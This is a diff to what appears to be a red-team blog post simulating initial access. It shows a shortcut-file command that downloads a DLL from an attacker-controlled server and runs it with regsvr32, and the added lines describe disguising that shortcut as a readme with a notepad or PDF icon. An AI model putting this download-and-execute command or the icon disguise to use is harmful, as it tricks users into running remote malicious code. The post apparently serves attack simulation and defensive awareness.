@@ -67,8 +67,25 @@ The full command specified inside the shortcut file is the following:
 ```powershell 
 C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && regsvr32 %TMP%\h.dll 
 ```
-__Note:__ The powershell download can be performed with the usual suspect IEX Download String function
+__Note:__ The powershell download can be performed with the usual suspect IEX Download String function. 🚩
 
+Futhermore, the above command is included inside the readme.lnk file which will lool like this to the end user. 
+
+<p align="center">
+  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk.PNG">
+</p>
+
+Since we don't want to show the typical cmd.exe icon we can then add a specific icon that in this case will be notepad. 
+
+<p align="center">
+  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk2.PNG">
+</p>
+
+__Note:__ Obviously we can create a .lnk file with the desired command and subsequently add the typical pdf icon. 🚩
+
+<p align="center">
+  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk3.PNG">
+</p>
 
 Upon executing the `readme.txt` file on the attacker machine we can see a web request on the webserver. 
 
